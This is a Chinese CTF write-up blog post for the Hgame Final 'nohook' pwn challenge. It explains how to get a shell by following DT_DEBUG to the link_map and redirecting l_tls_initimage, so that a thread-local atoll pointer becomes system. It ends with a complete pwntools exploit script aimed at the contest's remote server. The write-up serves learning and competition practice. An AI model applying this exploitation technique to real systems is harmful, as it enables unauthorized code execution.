<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>HgameFINAL-nohook-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hg"><meta property="og:image" content><meta property="og:title" content="HgameFINAL-nohook-WP"><meta property="og:description" content="Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hg"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1183.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-03-13T23:01:00+00:00"><meta property="article:modified_time" content="2021-03-13T23:01:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="HgameFINAL-nohook-WP"><meta name=twitter:description content="Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hg"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.de8e14713ae9807c3dcb9a2d4d23593943f05e39597fca17ff3aa7434a89d718.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>HgameFINAL-nohook-WP</h1><div class=meta>Posted on Mar 13, 2021</div></div><section class=body><p>Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hgame 到这里也正式结束了，总结就不写了。</p><p>这道题其实还是比较简单的，但是做了五个半小时，拿了两个 hint 才做出来，主要原因是从未接触过多线程开发，对 glibc 实现多线程的原理了解的非常浅，有许多需要的知识和 trick 不知道。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/3153794414.png></div><p>程序的主要功能是任意地址读写，常规来说这应该属于最简单的题目之一了，实则不然</p><p>首先是保护</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2281448179.png></div><p>只有 PIE 没有开，意味着无法通过劫持 got 表 getshell，但是一般来说这个不是问题，我们完全可以通过劫持 <code>__malloc_hook</code> <code>__free_hook</code> 来 getshell，而这就是本题的特点，正如题名</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2726873269.png></div><p>这俩货都会在进程结束时被置零。</p><p>即便是这样也还有办法，不是可以无限次任意地址读写嘛，那么完全可以 <code>FSOP</code>，但是事实上是不行的</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2933257009.png></div><p>进程退出不老老实实用 <code>exit</code>，非得要 <code>syscall</code>，又没有可控的堆操作，无法执行 <code>_IO_flush_all_lockp</code> 函数，当然 <code>main</code> 函数结束后也会调用这个函数，但是这里</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2872055473.png></div><p>有个 <code>while(1)</code>.. <code>main</code> 函数不会返回。那么我已知的利用方法都没法玩了。</p><p>本题的另一个特殊之处在于核心流程是由 <code>pthread_create</code> 创建新进程调用的，而且 <code>start_routine</code> 里面又大量使用了 <code>fs</code> 这个段寄存器，联想的之前做过的 <a href=https://www.cjovi.icu/WP/985.html>starctf2018_babystack</a>（当时做完这题后本来准备简单研究一下 <code>TLS</code> 的机制，然后发现看不懂就暂时放下了），考虑转向思路至 <code>TLS</code> 上。但是 <code>TLS</code> 我可以说没什么科学的了解，所以思考的时候也没什么底气。只能先调试看看程序是怎么获得要执行的函数的地址的</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2071020045.png></div><p>这里学到一个新指令 <code>fsbase</code>，由于 <code>fs</code> 寄存器是用户态无法访问的，所以需要用这个指令来获得 <code>fs</code> 的值，然后根据代码中寻址的方法，得知 <code>fs - 0x18</code> 开始的 3 个四字分别是 <code>write</code> <code>read</code> <code>atoll</code> 的地址，这也照应了调试图。那么自然的想法是直接修改 <code>atoll</code>，劫持为 <code>system</code> getshell，自然地我也这么去做了，发现没用，有些许奇怪。</p><p>遂开始搜集信息，然后发现有 <code>__thread</code> 这个关键字来修饰那些带有全局性且值可能变，但是又不值得用全局变量保护的变量。啥意思呢，大概就是如果一个全局变量用 <code>__thread</code> 修饰了，那么在每个线程对这个变量访问时，访问的都是其副本，修改时只会修改副本的值，而不会对原值（image）发生修改，而且访问速度也可以与全局变量相当。看起来很牛，猜测本题中三个函数的地址也是用了这个关键字修饰的。那么之前的尝试无果也可以理解了。</p><p>既然是全局变量的副本，那么我们只要修改了这个全局变量不就成了？然后开始找，死找找不到。不久就获得了第一个 hint，就是这个<a href=https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-tls.c#L435>网址</a>，指向的是 <code>_dl_allocate_tls_init</code> 这个函数，那就看看这个函数干啥的呗，了解到拷贝原值的过程就是这个函数做的，也就是这段代码</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>	  memset (__mempcpy (dest, map-&gt;l_tls_initimage,
</span></span><span style=display:flex><span>			     map-&gt;l_tls_initimage_size), &#39;\0&#39;,
</span></span><span style=display:flex><span>		  map-&gt;l_tls_blocksize - map-&gt;l_tls_initimage_size);
</span></span></code></pre></div><p>调试一下看看，断在</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/454284053.png></div><p>此处，再一看此时 <code>map</code> 结构体的尾部</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2132386091.png></div><p>得知两点，首先是全局变量的位置</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/03/2389365956.png></div><p>看起来这里是可写的，但是实际上是不可以的，这个通过 gdb 的 <code>vmmap</code> 就可以看出。</p><p>其次是由于拷贝的起始地址和拷贝长度就是由这个 <code>map</code> 控制的，如果我们劫持 <code>map</code> 结构体的 <code>l_tls_initimage</code> 指针，指向一个布置了 <code>system</code> 地址的内存空间，那么之后调用 <code>atoll</code> 的时候实际上就是在调用 <code>system</code>，就可以 getshell。</p><p>现在的问题就只在如何获得 <code>map</code> 的地址了，试了一些方法，但是由于不会获得 <code>ld</code> 的基地址都失败了，好像带多个库的程序通过 got 表来计算各种基地址是不行的。然后就拿到了第二个 hint</p><blockquote><p>可以关注下 DT_DEBUG 0x403E70</p></blockquote><p>于是得知 <code>DT_DEBUG</code> ,在本程序中在 <code>0x403E70</code>，运行时会指向 <code>struct r_debug</code>，而<code>struct r_debug</code> 的第二个元素就会指向第一个 <code>link_map</code>，而本题的第一个 <code>link_map</code> 的 <code>l_tls_initimage</code> 指针就是指向 <code>0x403D70</code>，我们通过多次任意地址读，就可以读出第一个 <code>link_map</code> 的地址，与这个地址偏移 0x428 处就是 <code>l_tls_initimage</code> 指针了，再通过任意地址写就可以将它指向我们布置好的内存了。</p><p>这个“布置好的内存”可以布置在 <code>0x404000</code> 这个页中，依次写 <code>write</code> <code>read</code> <code>system</code> 就可以了，比较简单，这里就不多说了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#!/usr/bin/env python
</span></span></span><span style=display:flex><span><span style=color:#007020># coding=utf-8
</span></span></span><span style=display:flex><span><span style=color:#007020></span>from pwn import <span style=color:#666>*</span>
</span></span><span style=display:flex><span>from LibcSearcher import <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context.log_level <span style=color:#666>=</span> <span>&#39;</span>debug<span>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020>#sh = process(&#34;./nohook&#34;)
</span></span></span><span style=display:flex><span><span style=color:#007020></span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.104.107&#34;</span>,<span style=color:#40a070>30822</span>)
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./nohook&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#007020>#libc = ELF(&#34;./lib/libc.so.6&#34;)
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span>def write_in(addr,value)<span style=color:#666>:</span>
</span></span><span style=display:flex><span>    sh.sendlineafter(<span style=color:#4070a0>&#34;mode?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,str(<span style=color:#40a070>1</span>))
</span></span><span style=display:flex><span>    sh.sendlineafter(<span style=color:#4070a0>&#34;where?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,str(addr))
</span></span><span style=display:flex><span>    sh.sendlineafter(<span style=color:#4070a0>&#34;what?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,str(value))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def read_from(addr)<span style=color:#666>:</span>
</span></span><span style=display:flex><span>    sh.sendlineafter(<span style=color:#4070a0>&#34;mode?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,str(<span style=color:#40a070>2</span>))
</span></span><span style=display:flex><span>    sh.sendlineafter(<span style=color:#4070a0>&#34;where?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,str(addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>read_from(elf.got[<span style=color:#4070a0>&#34;write&#34;</span>])
</span></span><span style=display:flex><span>write_addr <span style=color:#666>=</span> u64(sh.recv(<span style=color:#40a070>6</span>).ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;\x00&#39;</span>))
</span></span><span style=display:flex><span>read_addr <span style=color:#666>=</span> write_addr <span style=color:#666>+</span> <span style=color:#40a070>0xA0</span>
</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> write_addr <span style=color:#666>-</span> <span style=color:#40a070>0x1B0E70</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DT_DEBUG <span style=color:#666>=</span> <span style=color:#40a070>0x403E68</span> <span style=color:#666>+</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>read_from(DT_DEBUG)
</span></span><span style=display:flex><span>_r_debug_addr <span style=color:#666>=</span> u64(sh.recv(<span style=color:#40a070>6</span>).ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;\x00&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>read_from(_r_debug_addr <span style=color:#666>+</span> <span style=color:#40a070>8</span>)
</span></span><span style=display:flex><span>first_linkmap_addr <span style=color:#666>=</span> u64(sh.recv(<span style=color:#40a070>6</span>).ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;\x00&#39;</span>))
</span></span><span style=display:flex><span>log.success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> hex(first_linkmap_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fake_destination <span style=color:#666>=</span> <span style=color:#40a070>0x404A00</span>
</span></span><span style=display:flex><span>write_in(fake_destination,write_addr)
</span></span><span style=display:flex><span>write_in(fake_destination <span style=color:#666>+</span> <span style=color:#40a070>0x8</span>,read_addr)
</span></span><span style=display:flex><span>write_in(fake_destination <span style=color:#666>+</span> <span style=color:#40a070>0x10</span>,system_addr)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>tls_initimage_addr <span style=color:#666>=</span> first_linkmap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x428</span>
</span></span><span style=display:flex><span>write_in(tls_initimage_addr,fake_destination)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.sendlineafter(<span style=color:#4070a0>&#34;mode?</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#34;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.interactive()
</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/hctf-game>hctf-game</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2023  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>